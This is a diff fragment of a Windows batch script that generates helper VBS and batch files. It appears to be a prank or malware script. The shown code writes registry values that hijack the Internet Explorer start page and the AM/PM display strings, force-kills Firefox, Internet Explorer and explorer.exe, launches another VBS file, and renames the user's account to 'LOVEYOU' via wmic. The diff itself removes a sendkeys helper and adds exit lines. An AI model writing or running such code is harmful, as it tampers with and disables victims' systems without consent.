@@ -36,11 +36,6 @@ echo Set WshShell = CreateObject ("wscript.shell") >> ieandstuff.vbs
 echo WshShell.Regwrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","https://i.imgur.com/DAipxxw.jpeg", "REG_SZ" >> ieandstuff.vbs
 echo WshShell.Regwrite "HKCU\Control Panel\International\s1159", "HAPPY","REG_SZ" >> ieandstuff.vbs
 echo WshShell.Regwrite "HKCU\Control Panel\International\s2359", "HAPPY","REG_SZ" >> ieandstuff.vbs
-goto NoMoreCommandWindowHehe
-
-:NoMoreCommandWindowHehe
-echo Set WshShell = CreateObject("wscript.shell") >> enterkey.vbs
-echo WshShell.Sendkeys "{ENTER}" >> enterkey.vbs
 goto NoMoreExplorer
 
 :NoMoreExplorer
@@ -50,6 +45,7 @@ echo taskkill /f /im firefox.exe >> explorer.bat
 echo taskkill /f /im iexplore.exe >> explorer.bat
 echo taskkill /f /im explorer.exe >> explorer.bat
 echo start halloween2.vbs >> explorer.bat
+echo exit >> explorer.bat
 goto IAmAlwaysHappy
 
 :IAmAlwaysHappy
@@ -66,6 +62,7 @@ goto ChangeUrRealName
 :ChangeUrRealName
 echo wmic useraccount where name='%username%' set FullName='LOVEYOU' >> username.bat
 echo wmic useraccount where name='%username%' rename 'LOVEYOU' >> username.bat
+echo exit >> username.bat
 goto NowItsTooLate
 
 :NowItsTooLate
